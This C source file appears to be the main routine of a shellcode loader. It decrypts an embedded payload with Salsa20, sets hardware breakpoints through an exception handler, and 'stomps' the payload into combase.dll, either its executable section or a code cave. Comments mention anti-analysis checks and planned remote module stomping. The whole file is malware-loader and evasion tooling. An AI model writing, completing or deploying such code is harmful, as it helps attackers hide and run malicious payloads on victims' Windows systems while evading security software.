#include "Common.h"
#include "Shellcode.h"

// todo: add remote module stomping & payload encryption

int main(int argc, char* argv[])
{

    //------------------------------------------------------

    //CheckForAnalysis();

    WCHAR   TARGET_DLL[]        = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','c','o','m','b','a','s','e','.','d','l','l','\0' };
    SIZE_T  PayloadSize         = sizeof(Payload);

    //------------------------------------------------------

    if (argc < 2) {
        printf("Usage:\n");
        printf("-Rx                     RX Stomp\n");
        printf("-CodeCave               Code Cave Stomp\n");
        return 1;
    }

    //------------------------------------------------------

    AddVectoredExceptionHandler(1, &HardwareBreakpointExceptionHandler);

    SetHardwareBreakpoint();
    SetHardwareBreakpoint();
    SetHardwareBreakpoint();
    SetHardwareBreakpoint();

    UCHAR* PlainText = HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, PayloadSize);
    if (!PlainText)
        return FALSE;

    if (!Salsa20Crypt(Payload, PayloadSize, key, nonce, PlainText))
    {
        HeapFree(pGetProcessHeap(), 0, PlainText);
        return FALSE;
    }

    //------------------------------------------------------

    if (strcmp(argv[1], "-Rx") == 0) 
    {
        if (!LocalModuleStompRxSection(TARGET_DLL, PlainText, PayloadSize))
        {
#ifdef DEBUG
            PRINT_ERROR("LocalModuleStompRxSection");
#endif
            return 1;
        }

    }

    //------------------------------------------------------

    else if (strcmp(argv[1], "-CodeCave") == 0) 
    {
        if (!LocalModuleStompCodeCave(TARGET_DLL, PlainText, PayloadSize))
        {
#ifdef DEBUG
            PRINT_ERROR("LocalModuleStompCodeCave");
#endif
            return 1;
        }

    }

    //------------------------------------------------------

    else 
    {
        fprintf(stderr, "Unknown argument: %s\n", argv[1]);
        return 1;
    }

    //------------------------------------------------------

    RemoveHardwareBreakpoint();

    CHAR("Quit...");
    getchar();

    return 0;

}